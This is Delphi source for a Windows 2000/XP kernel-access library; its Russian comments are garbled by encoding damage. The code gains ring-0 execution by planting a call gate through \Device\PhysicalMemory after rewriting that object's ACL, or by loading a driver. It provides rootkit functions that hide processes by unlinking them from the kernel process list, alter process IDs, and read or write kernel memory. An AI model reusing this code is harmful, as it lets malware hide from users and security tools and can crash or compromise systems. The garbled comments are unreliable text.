{
  Delphi Ring0 Library. 
  ������ݧߧ֧ߧڧ� �ܧ�է� �� �ߧ�ݧ֧ӧ�� �ܧ�ݧ���, 
  ��ѧҧ��� �� �����֧��ѧާ� �� ��ѧާ���� ��է��. 
  Coded By Ms-Rem ( [email=Ms-Rem@yandex.ru]Ms-Rem@yandex.ru[/email] ) ICQ 286370715  
} 
unit Ring0; 
interface 
uses 
  Windows, 
  NativeApi; 
type 
 TPROCESS = packed record 
    ProcessId : dword; 
    ImageName : array [0..15] of Char; 
    pEPROCESS : dword; 
    ParrentPid: dword; 
    end; 
 PSYS_PROCESSES = ^TSYS_PROCESSES; 
 TSYS_PROCESSES = packed record 
   ProcessesCount: dword; 
   Process: array[0..0] of TPROCESS; 
   end; 

const 
 CALL_GATE   = 0; 
 DRIVER_GATE = 1; 
function OpenPhysicalMemory(mAccess: dword): THandle; 
function QuasiMmGetPhysicalAddress(VirtualAddress: dword; 
                                   var Offset: dword): dword; 
Procedure CallRing0(const Ring0Proc: pointer; Param: pointer); 
function GetKernelModuleAddress(pModuleName: PChar): dword; 
Function GetPhysicalAddress(VirtualAddress: dword): LARGE_INTEGER; stdcall; 
function MapVirtualMemory(vAddress: pointer; Size: dword): pointer; 
Procedure Ring0CopyMemory(Source, Destination: pointer; Size: dword); 
Function GetKernelProcAddress(lpProcName: PChar): dword; 
function GetSystemEPROCESS(): dword; 
function InitialzeRing0Library(Ring0GateType: dword): boolean; 
Procedure FreeRing0Library(); 
Function GetEPROCESSAdr(ProcessId: dword): dword; 
Procedure HideProcessEx(pEPROCESS: dword); 
function HideProcess(ProcessId: dword): dword; 
Procedure FreeSystemMemory(Mem: dword); 
Procedure ShowProcess(pEPROCESS: dword); 
function GetProcesses(): PSYS_PROCESSES; 
function InjectDataToSystemMemory(Mem: pointer; Size: dword): dword; 
Procedure ChangeProcessIdEx(pEPROCESS: dword; NewPid: dword); 
Procedure ChangeProcessId(OldPid: dword; NewPid: dword); 
Procedure ChangeProcessNameEx(pEPROCESS: dword; NewName: PChar); 
Procedure ChangeProcessName(ProcessId: dword; NewName: PChar); 
Procedure SetIoAccessMap(pMap: pointer); 
Procedure GetIoAccessMap(pMap: pointer); 
Procedure SetIoAccessProcessEx(pEPROCESS: dword; Access: boolean); 
Procedure SetIoAccessProcess(ProcessId: dword; Access: boolean); 
Procedure OpenPort(Port: dword; CanOpen: boolean); 
Procedure DisableHDD(); 
Procedure FastReboot(); 

implementation 
type 
  PFarCall = ^TFarCall; 
  TFarCall = packed record 
    Offset: DWORD; 
    Selector: Word; 
  end; 
  
  TGDTInfo = packed record 
    Limit: Word; 
    Base: DWORD; 
  end; 
  PGateDescriptor = ^TGateDescriptor; 
  TGateDescriptor = packed record 
    OffsetLo: Word;   // �ߧڧاߧڧ� 2 �ҧѧۧ�� �ѧէ�֧�� 
    Selector: Word;   // �ܧ�է�ӧ�� ��֧ݧ֧ܧ��� (����֧է֧ݧ�֧� ���ڧӧڧݧ֧ԧڧ�) 
    Attributes: Word; // �ѧ��ڧҧ��� ��ݧ�٧� 
    OffsetHi: Word;   // �ӧ֧��ߧڧ� 2 �ҧѧۧ�� �ѧէ�֧�� 
  end; 
  PR0DriverQuery = ^TR0DriverQuery; 
  TR0DriverQuery = packed record 
    QueryType: dword; 
    Param1: dword; 
    Param2: dword; 
    Param3: dword; 
    end; 
  TRUSTEE_A = packed record 
    pMultipleTrustee: pointer; 
    MultipleTrusteeOperation: dword; 
    TrusteeForm: dword; 
    TrusteeType: dword; 
    ptstrName: PAnsiChar; 
  end; 
  PEXPLICIT_ACCESS = ^EXPLICIT_ACCESS; 
  EXPLICIT_ACCESS = packed record 
    grfAccessPermissions: DWORD; 
    grfAccessMode: dword; 
    grfInheritance: DWORD; 
    Trustee: TRUSTEE_A; 
  end; 
function GetSecurityInfo(handle: THandle; ObjectType: dword; 
                         SecurityInfo: SECURITY_INFORMATION; 
                         ppsidOwner, ppsidGroup: ppointer; 
                         ppDacl, ppSacl: pointer; 
                         var ppSecurityDescriptor: PSECURITY_DESCRIPTOR): DWORD; 
                            stdcall; external 'advapi32.dll'; 
function SetEntriesInAclA(cCountOfExplicitEntries: ULONG; 
                          pListOfExplicitEntries: PEXPLICIT_ACCESS; 
                          OldAcl: PACL; var NewAcl: PACL): DWORD; 
                            stdcall; external 'advapi32.dll'; 
function SetSecurityInfo(handle: THandle; ObjectType: dword; 
                         SecurityInfo: SECURITY_INFORMATION; 
                         ppsidOwner, ppsidGroup: ppointer; 
                         ppDacl, ppSacl: PACL): DWORD; 
                            stdcall; external 'advapi32.dll'; 
  
const 
 KernelName = 'ntoskrnl.exe'; 
 MemDeviceName: PWideChar = '\Device\PhysicalMemory'; 
 Driver = '\registry\machine\system\CurrentControlSet\Services\KernelPort'; 
 SE_KERNEL_OBJECT    = 6; 
 GRANT_ACCESS        = 1; 
 NO_MULTIPLE_TRUSTEE = 0; 
 TRUSTEE_IS_NAME     = 1; 
 TRUSTEE_IS_USER     = 1; 
 NO_INHERITANCE      = 0; 
var 
 FarCall: TFarCall; 
 CurrentGate: PGateDescriptor; 
 OldGate: TGateDescriptor; 
 ptrGDT: Pointer;       
 Ring0ProcAdr: pointer; // ��֧ܧ��ڧ� ��ܧѧ٧ѧ�֧ݧ� �ߧ� �ܧ�� ���էݧ֧اѧ�ڧ� �ӧ�٧�ӧ� ��֧�֧� ��ݧ��. 
 AdrMmGetPhys: dword;   // GetPhysicalAddress 
 AdrMmIsValid: dword;   // MmIsAddressValid 
 AdrIoGetCurr: dword;   // IoGetCurrentProcess 
 AdrSetIoAccess: dword; // Ke386SetIoAccessMap 
 AdrGetIoAccess: dword; // Ke386GetIoAccessMap 
 AdrSetAccProc: dword;  // Ke386IoSetAccessProcess 
 AdrExAllocPool: dword; // ExAllocatePool 
 AdrExFreePool: dword;  // ExFreePool 
 GateType: dword; 
 KernelBase : dword;    // �ѧէ�֧� ��է�� �� ��ѧާ��� 
 dKernelBase: dword;    // �ѧէ�֧� ��է�� ���էԧ��ا֧ߧߧ�ԧ� �� User Space 
 hPhysMem: dword;       // ���ߧէ� ��֧ܧ�ڧ� \Device\PhysicalMemory 
 hDriver: dword; 
  
 UndocData : packed record 
         {00} BaseProcStrAdr    : dword; // �ѧէ�֧� ��֧�ӧ�� EPROCESS 
         {04} ActivePsListOffset: dword; // ��ާ֧�֧ߧڧ� ActivePsList �� EPROCESS 
         {08} PidOffset: dword;          // ��ާ֧�֧ߧڧ� ProcessID �� EPROCESS 
         {0C} NameOffset: dword;         // ��ާ֧�֧ߧڧ� ImageName �� EPROCESS 
         {10} ppIdOffset: dword;         // ��ާ֧�֧ߧڧ� ParrentPid �� EPROCESS 
         {14} ImgNameOffset: dword;      // ��ާ֧�֧ߧڧ� ImageFileName �� EPROCESS 
             end; 
{ ��֧�֧٧ѧԧ��٧ܧ� ��֧ԧڧ���� FS �� �ӧ�٧�� Ring0 �ܧ�է�  } 
procedure Ring0CallProc; 
asm 
 cli 
 pushad 
 pushfd 
 mov di, $30 
 mov fs, di 
 call Ring0ProcAdr 
 mov di, $3B 
 mov fs, di 
 popfd 
 popad 
 sti 
 retf 
end; 
Procedure SendDriverRequest(ReqType, Param1, Param2: dword); 
var 
 Query: TR0DriverQuery; 
 Written: dword; 
begin 
 Query.QueryType := ReqType; 
 Query.Param1    := Param1; 
 Query.Param2    := Param2; 
 WriteFile(hDriver, Query, SizeOf(TR0DriverQuery), Written, nil); 
end; 
{ ����ܧ���ڧ� ��ڧ٧ڧ�֧�ܧ�� ��ѧާ��� } 
function OpenPhysicalMemory(mAccess: dword): THandle; 
var 
  PhysMemString: TUnicodeString; 
  Attr: TObjectAttributes; 
  OldAcl, NewAcl: PACL; 
  SD: PSECURITY_DESCRIPTOR; 
  Access: EXPLICIT_ACCESS; 
  mHandle: dword; 
begin 
  Result := 0; 
  RtlInitUnicodeString(@PhysMemString, MemDeviceName); 
  InitializeObjectAttributes(@Attr, @PhysMemString, OBJ_CASE_INSENSITIVE or 
                             OBJ_KERNEL_HANDLE, 0, nil); 
  if ZwOpenSection(@mHandle, READ_CONTROL or 
                   WRITE_DAC , @Attr) <> STATUS_SUCCESS then Exit; 
  if GetSecurityInfo(mHandle, SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, 
                     nil, nil, @OldAcl, nil, SD) <> ERROR_SUCCESS then Exit; 
  with Access do 
    begin 
     grfAccessPermissions := mAccess; 
     grfAccessMode := GRANT_ACCESS; 
     grfInheritance := NO_INHERITANCE; 
     Trustee.pMultipleTrustee := nil; 
     Trustee.MultipleTrusteeOperation := NO_MULTIPLE_TRUSTEE; 
     Trustee.TrusteeForm := TRUSTEE_IS_NAME; 
     Trustee.TrusteeType := TRUSTEE_IS_USER; 
     Trustee.ptstrName := 'CURRENT_USER'; 
    end; 
   SetEntriesInAclA(1, @Access, OldAcl, NewAcl); 
   SetSecurityInfo(mHandle , SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, 
                   nil, nil, NewAcl, nil); 
   ZwOpenSection(@Result, mAccess, @Attr); 
   SetSecurityInfo(mHandle , SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, 
                   nil, nil, OldAcl, nil); 
   CloseHandle(mHandle); 
   LocalFree(DWORD(NewAcl)); 
   LocalFree(DWORD(SD)); 
end; 

{ 
  ����ݧ��֧ߧڧ� ��ڧ٧ڧ�֧�ܧ�ԧ� �ѧէ�֧�� �ڧ� �ӧڧ���ѧݧ�ߧ�ԧ�. 
  ���֧ۧ��ӧڧ�֧ݧ�ߧ� ���ݧ�ܧ� �էݧ� Nonpaged Memory. 
} 
function QuasiMmGetPhysicalAddress(VirtualAddress: dword; 
                                   var Offset: dword): dword; 
begin 
  Offset := VirtualAddress and $FFF; 
  if (VirtualAddress > $80000000) and (VirtualAddress < $A0000000) then 
    Result := VirtualAddress and $1ffff000 
    else Result := VirtualAddress and $fff000; 
end; 

{ ����ѧߧ�ӧܧ� �ܧѧݧԧ֧ۧ�� } 
Function InstallCallgate(hPhysMem: dword): boolean; 
var 
  gdt: TGDTInfo; 
  offset, base_address: DWORD; 
begin 
  Result := false; 
  if hPhysMem = 0 then Exit; 
  asm sgdt [gdt] end; 
  base_address := QuasiMmGetPhysicalAddress(gdt.Base, offset); 
  ptrGDT := MapViewOfFile(hPhysMem, FILE_MAP_READ or FILE_MAP_WRITE, 
                          0, base_address, gdt.limit + offset); 
  if ptrGDT = nil then Exit; 
  CurrentGate := PGateDescriptor(DWORD(ptrGDT) + offset); 
  repeat 
    CurrentGate := PGateDescriptor(DWORD(CurrentGate) + SizeOf(TGateDescriptor)); 
    if (CurrentGate.Attributes and $FF00) = 0 then 
      begin 
        OldGate := CurrentGate^; 
        CurrentGate.Selector   := $08; // ring0 code selector 
        CurrentGate.OffsetLo   := DWORD(@Ring0CallProc); 
        CurrentGate.OffsetHi   := DWORD(@Ring0CallProc) shr 16; 
        CurrentGate.Attributes := $EC00; 
        FarCall.Offset   := 0; 
        FarCall.Selector := DWORD(CurrentGate) - DWORD(ptrGDT) - offset; 
        Break; 
      end; 
  until DWORD(CurrentGate) >= DWORD(ptrGDT) + gdt.limit + offset; 
  FlushViewOfFile(CurrentGate, SizeOf(TGateDescriptor)); 
  Result := true; 
end; 
{ ��էѧݧ֧ߧڧ� �ܧѧݧݧԧ֧ۧ�� } 
Procedure UninstallCallgate(); 
begin 
  CurrentGate^ := OldGate; 
  UnmapViewOfFile(ptrGDT); 
end; 
{ ����٧�� �����֧է��� �� ��֧�֧��է�� �� 0 �ܧ�ݧ���. } 
Procedure CallRing0(const Ring0Proc: pointer; Param: pointer); 
begin 
 case GateType of 
   CALL_GATE : asm 
                mov eax, Ring0Proc 
                mov Ring0ProcAdr, eax 
                mov eax, Param 
                db $0ff, $01d      // call far [FarCall] 
                dd offset FarCall; // 
               end; 
               
   DRIVER_GATE : SendDriverRequest(0, dword(Ring0Proc), dword(Param)); 
 end; 
end; 

{ 
  ����ݧ��֧ߧڧ� �ӧڧ���ѧݧ�ߧ�ԧ� �ѧէ�֧�� �էݧ� �ާ�է�ݧ� 
  �٧ѧԧ��ا֧ߧߧ�ԧ� �� ��ڧ��֧ާߧ�� �ѧէ�֧�ߧ�� �������ѧߧ��ӧ�. 
} 
function GetKernelModuleAddress(pModuleName: PChar): dword; 
var 
 Info: PSYSTEM_MODULE_INFORMATION_EX; 
 R: dword; 
begin 
  Result := 0; 
  Info := GetInfoTable(SystemModuleInformation); 
  for r := 0 to Info^.ModulesCount do 
   if lstrcmpi(PChar(dword(@Info^.Modules[r].ImageName) 
                     + Info^.Modules[r].ModuleNameOffset), pModuleName) = 0 then 
       begin 
        Result := dword(Info^.Modules[r].Base); 
        break; 
       end; 
  VirtualFree(Info, 0, MEM_RELEASE); 
end; 

{ 
  ����ݧ��֧ߧڧ� ��ڧ٧ڧ�֧�ܧ�ԧ� �ѧէ�֧�� ��� �ӧڧ���ѧݧ�ߧ�ާ�. 
  ���֧ۧ��ӧڧ�֧ݧ�ߧ� �էݧ� �ݧ�ҧ�� ��֧ԧڧ�ߧ�� ��ѧާ���. 
} 
Function GetPhysicalAddress(VirtualAddress: dword): LARGE_INTEGER; stdcall; 
var 
 Data : packed record 
   VirtualAddress: dword; 
   Result: LARGE_INTEGER; 
   end; 
 Procedure Ring0Call; 
 asm 
  mov ebx, [eax] 
  push ebx 
  mov esi, eax 
  call AdrMmGetPhys 
  mov  [esi + $04], eax 
  mov  [esi + $08], edx 
  ret 
 end; 
begin 
  Data.VirtualAddress := VirtualAddress; 
  CallRing0(@Ring0Call, @Data); 
  Result.QuadPart := Data.Result.QuadPart; 
end; 

{ 
  �����ҧ�ѧا֧ߧڧ� ���ѧ��ܧ� �ӧڧ���ѧݧ�ߧ�� ��ѧާ��� �� 
  ��֧ܧ��֧� �����֧��� ��֧�֧� ��ڧ٧ڧ�֧�ܧ�� ��ѧާ���. 
} 
function MapVirtualMemory(vAddress: pointer; Size: dword): pointer; 
var 
 MappedAddress: LARGE_INTEGER; 
begin 
  Result := nil; 
  MappedAddress := GetPhysicalAddress(dword(vAddress)); 
  if MappedAddress.QuadPart = 0 then Exit; 
  Result := MapViewOfFile(hPhysMem, FILE_MAP_READ or FILE_MAP_WRITE, 
                          0, MappedAddress.LowPart, Size); 
end; 

{ 
  �����ڧ��ӧѧߧڧ� ���ѧ��ܧ� ��ѧާ��� �ڧ� 0 �ܧ�ݧ���. 
  ����اߧ� ��ѧҧ��ѧ�� �� ��ѧާ���� ��է��. 
  ����������������! �ߧ֧ܧ���֧ܧ�ߧѧ� �٧ѧ�ڧ�� �� ��ѧާ��� ��է�� ���ڧӧ֧է֧� �� ��ѧէ֧ߧڧ� ��ڧ��֧ާ�! 
} 
Procedure Ring0CopyMemory(Source, Destination: pointer; Size: dword); 
var 
 Data : packed record 
    Src: pointer; 
    Dst: pointer; 
    Size: dword; 
   end; 
 Procedure Ring0Call; 
 asm 
  //����ӧ֧�ܧ� �ѧէ�֧��� 
  mov ebx, eax 
  mov eax, [ebx] 
  push eax 
  call AdrMmIsValid 
  test eax, eax 
  jz @Exit 
  mov eax, [ebx] 
  add eax, [ebx + $08] 
  push eax 
  call AdrMmIsValid 
  test eax, eax 
  jz @Exit 
  mov eax, [ebx + $04] 
  push eax 
  call AdrMmIsValid 
  test eax, eax 
  jz @Exit 
  mov eax, [ebx + $04] 
  add eax, [ebx + $08] 
  push eax 
  call AdrMmIsValid 
  test eax, eax 
  jz @Exit 
  //�ܧ��ڧ��ӧѧߧڧ� 
  mov esi, [ebx] 
  mov edi, [ebx + $04] 
  mov ecx, [ebx + $08] 
  rep movsb 
  @Exit: 
  ret 
 end; 
begin 
 Data.Src  := Source; 
 Data.Dst  := Destination; 
 Data.Size := Size; 
 VirtualLock(Source, Size); 
 VirtualLock(Destination, Size); 
 CallRing0(@Ring0Call, @Data); 
 VirtualUnlock(Source, Size); 
 VirtualUnlock(Destination, Size); 
end; 

{ ����ݧ��֧ߧڧ� �ѧէ�֧�� ��է֧�ߧ�� API �� ��ڧ��֧ާߧ�� �ѧէ�֧�ߧ�� �������ѧߧ��ӧ�. } 
Function GetKernelProcAddress(lpProcName: PChar): dword; 
var 
 uProc: dword; 
begin 
 uProc  := dword(GetProcAddress(dKernelBase, lpProcName)); 
 if uProc > 0 then Result := (uProc - dKernelBase) + KernelBase 
    else Result := 0; 
end; 
{ ���ݧ��֧ߧڧ� ��ܧѧ٧ѧ�֧ݧ� �ߧ� �����ܧ���� EPROCESS �էݧ� System } 
function GetSystemEPROCESS(): dword; 
var 
 Data: packed record 
        UndocAdr: pointer; 
        Result: dword; 
       end; 
       
 procedure Ring0Call; 
 asm 
  mov ebx, eax 
  call AdrIoGetCurr 
  mov edx, [ebx]       // UndocAdr 
  mov esi, [edx + $04] // ActivePsListOffset 
  mov edi, [edx + $10] // pPidOffset 
  @Find: 
  mov ecx, [eax + edi] 
  test ecx, ecx 
  jz @Found 
  mov eax, [eax + esi] 
  sub eax, esi 
  jmp @Find 
  @Found: 
  mov [ebx + $04], eax 
  ret 
 end; 
begin 
 Data.UndocAdr := @UndocData; 
 CallRing0(@Ring0Call, @Data); 
 Result := Data.Result; 
end; 
{ ���٧էѧߧڧ� �٧ѧ�ڧ�� �� �է�ѧۧӧ֧�� �� ��֧֧����. } 
Procedure InstallDriver(); 
var 
 Key, Key2: HKEY; 
 Pth: PChar; 
 dType: dword; 
 Image: array [0..MAX_PATH] of Char; 
begin 
 lstrcpy(Image, '\??\'); 
 GetFullPathName('Ring0Port.sys', MAX_PATH, PChar(dword(@Image) + 4), Pth); 
 dType := 1; 
 RegOpenKey(HKEY_LOCAL_MACHINE, 'system\CurrentControlSet\Services', Key); 
 RegCreateKey(Key, 'KernelPort', Key2); 
 RegSetValueEx(Key2, 'ImagePath', 0, REG_SZ, @Image, lstrlen(Image)); 
 RegSetValueEx(Key2, 'Type', 0, REG_DWORD, @dType, SizeOf(dword)); 
 RegCloseKey(Key2); 
 RegCloseKey(Key); 
end; 
{ ��էѧݧߧڧ� �ڧ� ��֧֧���� �٧ѧ�ڧ�� �� �է�ѧۧӧ֧��. } 
Procedure UninstallDriver(); 
var 
 Key: HKEY; 
begin 
 RegOpenKey(HKEY_LOCAL_MACHINE, 'system\CurrentControlSet\Services', Key); 
 RegDeleteKey(Key, 'KernelPort'); 
 RegCloseKey(Key); 
end; 
{ �٧ѧԧ��٧ܧ� �է�ѧۧӧ֧�� �� ���ܧ���ڧ� �֧ԧ� ������ۧ��ӧ�. } 
Function OpenDriver(): THandle; 
var 
 Image: TUnicodeString; 
begin 
 InstallDriver(); 
 RtlInitUnicodeString(@Image, Driver); 
 ZwLoadDriver(@Image); 
 Result := CreateFile('\\.\Ring0Port', GENERIC_WRITE, 0, 
                       nil, OPEN_EXISTING, 0, 0); 
end; 
{ ���ܧ���ڧ� ��ѧާ��� �� ����ѧߧ�ӧܧ� �ܧѧݧԧ֧ۧ��. } 
Function InitializeCallGate(): boolean; 
begin 
 Result := false; 
 hPhysMem := OpenPhysicalMemory(SECTION_MAP_READ or SECTION_MAP_WRITE); 
 if hPhysMem = 0 then Exit; 
 Result := InstallCallgate(hPhysMem); 
end; 

function InitializeDriverGate(): boolean; 
begin 
  hDriver := OpenDriver(); 
  Result := hDriver <> INVALID_HANDLE_VALUE; 
end; 

{ ���ߧڧ�ڧѧݧڧ٧ѧ�ڧ� Ring0 �ҧڧҧݧڧ��֧ܧ�. } 
function InitialzeRing0Library(Ring0GateType: dword): boolean; 
var 
 Version: TOSVersionInfo; 
begin 
 Result := false; 
 Version.dwOSVersionInfoSize := SizeOf(TOSVersionInfo); 
 GetVersionEx(Version); 
 if Version.dwMajorVersion <> 5 then Exit; 
 case Version.dwBuildNumber of 
 2195 : begin // Windows 2000 
         UndocData.ActivePsListOffset := $0A0; 
         UndocData.PidOffset          := $09C; 
         UndocData.NameOffset         := $1FC; 
         UndocData.ppIdOffset         := $1C8; 
         UndocData.ImgNameOffset      := $000; 
        end; 
 2600 : begin // Windows XP 
         UndocData.ActivePsListOffset := $088; 
         UndocData.PidOffset          := $084; 
         UndocData.NameOffset         := $174; 
         UndocData.ppIdOffset         := $14C; 
         UndocData.ImgNameOffset      := $1F4; 
        end; 
 else Exit; 
 end; 
 KernelBase     := GetKernelModuleAddress(KernelName); 
 dKernelBase    := LoadLibraryEx(KernelName, 0, DONT_RESOLVE_DLL_REFERENCES); 
 AdrMmGetPhys   := GetKernelProcAddress('MmGetPhysicalAddress'); 
 AdrMmIsValid   := GetKernelProcAddress('MmIsAddressValid'); 
 AdrIoGetCurr   := GetKernelProcAddress('IoGetCurrentProcess'); 
 AdrSetIoAccess := GetKernelProcAddress('Ke386SetIoAccessMap'); 
 AdrGetIoAccess := GetKernelProcAddress('Ke386QueryIoAccessMap'); 
 AdrSetAccProc  := GetKernelProcAddress('Ke386IoSetAccessProcess'); 
 AdrExAllocPool := GetKernelProcAddress('ExAllocatePool'); 
 AdrExFreePool  := GetKernelProcAddress('ExFreePool'); 
 GateType := Ring0GateType; 
 case GateType of 
   CALL_GATE   : Result := InitializeCallGate();                   
   DRIVER_GATE : Result := InitializeDriverGate(); 
 end; 
 if Result then UndocData.BaseProcStrAdr := GetSystemEPROCESS(); 
end; 
Procedure FreeDriver(); 
var 
 Image: TUnicodeString; 
begin 
 CloseHandle(hDriver); 
 RtlInitUnicodeString(@Image, Driver); 
 ZwUnloadDriver(@Image); 
 UninstallDriver(); 
end; 

{ ����ӧ�ҧ�اէ֧ߧڧ� ��֧������ �ҧڧҧݧڧ��֧ܧ� } 
Procedure FreeRing0Library(); 
begin 
 case GateType of 
   CALL_GATE   : begin 
                  UninstallCallgate(); 
                  CloseHandle(hPhysMem); 
                 end; 
   DRIVER_GATE : FreeDriver(); 
 end; 
 FreeLibrary(dKernelBase); 
end; 

{ 
  ����ݧ��֧ߧڧ� ��� ProcessId ��ܧѧ٧ѧ�֧ݧ� �ߧ� �����ܧ���� ��է�� EPROCESS 
  ��ӧ�٧ѧߧߧ�� �� �էѧߧߧ�� �����֧����. 
} 
Function GetEPROCESSAdr(ProcessId: dword): dword; 
var 
 Data: packed record 
        UndocAdr: pointer; 
        ProcessId: dword; 
        Result: dword; 
       end; 
 procedure Ring0Call; 
 asm 
  mov ebx, [eax]         //UndocAdr 
  mov ecx, [eax + $04]   //ProcessId 
  push eax 
  mov eax, [ebx]         //BaseProcStrAdr 
  mov esi, [ebx + $04]   //ActivePsListOffset 
  mov edi, [ebx + $08]   //PidOffset 
  @Find: 
  mov edx, [eax + edi]   //ActivePs.Pid 
  cmp edx, ecx           //compare process id 
  jz @Found 
  mov eax, [eax + esi]   // ActivePsList.Flink 
  sub eax, esi           //sub ActivePsListOffset 
  cmp eax, [ebx]         //final 
  jz @End 
  jmp @Find 
  @Found: 
  pop edx 
  mov [edx + $08], eax   //save result 
  ret 
  @End: 
  pop edx 
  mov [edx + $08], 0 
  ret 
 end; 
begin 
 Data.UndocAdr  := @UndocData; 
 Data.ProcessId := ProcessId; 
 CallRing0(@Ring0Call, @Data); 
 Result := Data.Result; 
end; 

{ 
  ���ܧ���ڧ� �����֧��� ��� ��ܧѧ٧ѧ�֧ݧ� �ߧ� �����ܧ���� ��է�� EPROCESS. 
  ���֧��ѧӧڧݧ�ߧ�� ��ܧѧ٧ѧ�֧ݧ� �ާ�ا֧� ���ڧӧ֧��� �� �ܧ�ѧ�� ��ڧ��֧ާ�! 
} 
Procedure HideProcessEx(pEPROCESS: dword); 
var 
 Data: packed record 
        UndocAdr: pointer; 
        pEPROCESS: dword; 
       end; 
 Procedure Ring0Call; 
 asm 
  push eax 
  mov eax, [eax + $04] 
  push eax 
  call AdrMmIsValid 
  test eax, eax 
  jz @Exit 
  pop eax 
  mov ebx, [eax]        //UndocAdr 
  mov ecx, [eax + $04]  //pEPROCESS 
  mov esi, [ebx + $04]  //ActivePsListOffset 
  mov edx, [ecx + esi]  //ActivePsList.Flink 
  add esi, $04 
  mov edi, [ecx + esi]  //ActivePsList.Blink 
  mov [edx + $04], edi  //ActivePsList.Flink.Blink = ActivePsList.Blink 
  mov [edi], edx        //ActivePsList.Blink.Flink = ActivePsList.Flink 
  ret 
  @Exit: 
  pop eax 
  ret 
 end; 
  
begin 
 if pEPROCESS = 0 then Exit; 
 Data.UndocAdr  := @UndocData; 
 Data.pEPROCESS := pEPROCESS; 
 CallRing0(@Ring0Call, @Data); 
end; 

{ 
  ���ܧ���ڧ� �����֧��� ��� ProcessId. 
  �� ��ݧ��ѧ� ��էѧ�� �ӧ�٧ӧ�ѧ�ѧ֧� ��ܧѧ٧ѧ�֧ݧ� �ߧ� EPROCESS, �ڧߧѧ�� 0. 
} 
function HideProcess(ProcessId: dword): dword; 
var 
 OldPriority: dword; 
begin 
 OldPriority := GetThreadPriority($FFFFFFFE); 
 SetThreadPriority($FFFFFFFE, THREAD_PRIORITY_TIME_CRITICAL); 
 Result := GetEPROCESSAdr(ProcessId); 
 HideProcessEx(Result); 
 SetThreadPriority($FFFFFFFE, OldPriority); 
end; 

{ �������ѧߧ�ӧݧ֧ߧڧ� �����֧��� �� ���ڧ�ܧ� �����֧���� ��� ��ܧѧ٧ѧ�֧ݧ� �ߧ�  EPROCESS. } 
Procedure ShowProcess(pEPROCESS: dword); 
var 
 Data: packed record 
        UndocAdr: pointer; 
        pEPROCESS: dword; 
       end; 
 Procedure Ring0Call; 
 asm 
  push eax 
  mov eax, [eax + $04] 
  push eax 
  call AdrMmIsValid 
  test eax, eax 
  jz @Exit 
  pop eax 
  mov ebx, [eax]        //UndocAdr 
  mov ecx, [eax + $04]  //pEPROCESS 
  mov esi, [ebx + $04]  //ActivePsListOffset 
  mov edx, [ebx]        //BaseProcStrAdr 
  add edx, esi          //@BaseProcStrAdr.Flink 
  add ecx, esi          //@pEPROCESS.Flink 
  mov [ecx + $04], edx  //pEPROCESS.Blink = @BaseProcStrAdr.Flink 
  mov eax, [edx]        //@BaseProcStrAdr.Flink.Flink 
  mov [ecx], eax        //pEPROCESS.Flink = @BaseProcStrAdr.Flink.Flink 
  mov [edx], ecx        //BaseProcStrAdr.Flink = @pEPROCESS.Flink 
  ret 
  @Exit: 
  pop eax 
  ret 
 end; 
  
begin 
 if pEPROCESS = 0 then Exit; 
 Data.UndocAdr  := @UndocData; 
 Data.pEPROCESS := pEPROCESS; 
 CallRing0(@Ring0Call, @Data); 
end; 
{ ����ݧ��֧ߧڧ� ���ڧ�ܧ� �����֧���� ����ާ�� �է������� �� �����ܧ���ѧ� ��է��. } 
function GetProcesses(): PSYS_PROCESSES; 
var 
 Eprocess: array [0..$600] of byte; 
 CurrentStruct: dword; 
 CurrSize: dword; 
 OldPriority: dword; 
begin 
 CurrSize := SizeOf(TSYS_PROCESSES); 
 GetMem(Result, CurrSize); 
 ZeroMemory(Result, CurrSize); 
 ZeroMemory(@Eprocess, $600); 
 CurrentStruct := UndocData.BaseProcStrAdr + UndocData.ActivePsListOffset; 
 OldPriority := GetThreadPriority($FFFFFFFE); 
 SetThreadPriority($FFFFFFFE, THREAD_PRIORITY_TIME_CRITICAL); 
 repeat 
  CurrentStruct := CurrentStruct - UndocData.ActivePsListOffset; 
  Ring0CopyMemory(pointer(CurrentStruct), @Eprocess, $220); 
  if pdword(dword(@Eprocess) + UndocData.ppIdOffset)^ > 0 then 
     begin 
      Inc(CurrSize, SizeOf(TPROCESS)); 
      ReallocMem(Result, CurrSize); 
      Result^.Process[Result^.ProcessesCount].ProcessId := 
                                pdword(dword(@Eprocess) + UndocData.PidOffset)^; 
      Result^.Process[Result^.ProcessesCount].pEPROCESS := CurrentStruct; 
      lstrcpyn(@Result^.Process[Result^.ProcessesCount].ImageName, 
              PChar(dword(@Eprocess) + UndocData.NameOffset), 16); 
      Result^.Process[Result^.ProcessesCount].ParrentPid := 
                                pdword(dword(@Eprocess) + UndocData.ppIdOffset)^; 
      Inc(Result^.ProcessesCount); 
     end; 
  CurrentStruct := pdword(dword(@Eprocess) + UndocData.ActivePsListOffset)^; 
  if CurrentStruct < $80000000 then break; 
 until CurrentStruct = UndocData.BaseProcStrAdr + UndocData.ActivePsListOffset; 
 SetThreadPriority($FFFFFFFE, OldPriority); 
end; 
{ ���ާ֧ߧ� Id �����֧��� ��� ��ܧѧ٧ѧ�֧ݧ� �ߧ� EPROCESS. } 
Procedure ChangeProcessIdEx(pEPROCESS: dword; NewPid: dword); 
var 
 Data: packed record 
        UndocAdr: pointer; 
        pEPROCESS: dword; 
        NewId: dword; 
       end; 
 Procedure Ring0Call; 
 asm 
  push eax 
  mov eax, [eax + $04] 
  push eax 
  call AdrMmIsValid 
  test eax, eax 
  jz @Exit 
  pop eax 
  mov ebx,   [eax]    
  mov esi,   [eax + $04] // pEPROCESS 
  add esi,   [ebx + $08] // @pEPROCESS.ProcessId 
  mov eax,   [eax + $08] // NewId 
  mov [esi], eax 
  ret 
  @Exit: 
  pop eax 
  ret 
 end; 
  
begin 
 if pEPROCESS = 0 then Exit; 
 Data.UndocAdr  := @UndocData; 
 Data.pEPROCESS := pEPROCESS; 
 Data.NewId     := NewPid; 
 CallRing0(@Ring0Call, @Data); 
end; 
{ ���ާ֧ߧ� Id �����֧���. } 
Procedure ChangeProcessId(OldPid: dword; NewPid: dword); 
var 
 OldPriority: dword; 
 pEPROCESS  : dword; 
begin 
 OldPriority := GetThreadPriority($FFFFFFFE); 
 SetThreadPriority($FFFFFFFE, THREAD_PRIORITY_TIME_CRITICAL); 
 pEPROCESS := GetEPROCESSAdr(OldPid); 
 ChangeProcessIdEx(pEPROCESS, NewPid); 
 SetThreadPriority($FFFFFFFE, OldPriority); 
end; 
{ 
